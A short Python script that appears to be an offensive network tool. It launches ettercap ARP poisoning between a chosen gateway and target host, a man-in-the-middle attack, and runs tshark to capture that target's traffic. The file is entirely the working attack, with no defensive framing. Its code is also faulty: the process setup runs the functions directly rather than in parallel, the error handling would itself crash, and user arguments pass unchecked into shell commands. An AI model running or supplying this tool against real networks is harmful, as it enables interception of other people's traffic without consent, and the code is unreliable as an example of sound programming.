import os
import sys


class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = "\033[97m"


def run_ettercap(iface: str, gateway: str, target: str):
    try:
        output = os.system(
            f"sudo ettercap -T -S -D -q -i {iface} -M arp:remote /{gateway}// /{target}//")

        print(Colors.GREEN + str(output))

    except PermissionError as pe:
        print(Colors.RED + pe)
        sys.exit()


def run_tshark(iface: str, target: str):
    try:
        output = os.system(
            f"sudo tshark -i {iface} -Y 'ip.addr == {target}'")

        print(Colors.GREEN + str(output))

    except PermissionError as pe:
        print(Colors.RED + pe)
        sys.exit()


if __name__ == "__main__":
    import argparse as ap
    from multiprocessing import Process

    parser = ap.ArgumentParser()

    parser.add_argument("-i", "--iface", help="The target interface to use")
    parser.add_argument("-g", "--gateway", help="The gateway IP address")
    parser.add_argument("-t", "--target", help="The target IP address")

    args = parser.parse_args()

    proc_ettercap = Process(target=run_ettercap(
        args.iface, args.gateway, args.target))
    proc_ettercap.start()

    proc_tshark = Process(target=run_tshark(args.iface, args.target))
    proc_tshark.start()
